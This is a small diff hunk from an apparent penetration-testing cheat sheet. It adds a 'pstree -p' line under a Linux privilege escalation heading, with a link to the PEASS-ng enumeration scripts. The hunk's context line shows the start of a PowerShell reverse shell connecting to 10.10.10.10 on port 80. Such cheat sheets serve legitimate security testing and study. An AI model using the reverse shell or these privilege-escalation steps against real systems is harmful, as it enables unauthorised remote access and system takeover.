@@ -414,6 +414,8 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $c
 
 # Linux Privilege Escalation
 
+pstree -p
+
 ## Enumeration scripts
 https://github.com/carlospolop/PEASS-ng
 
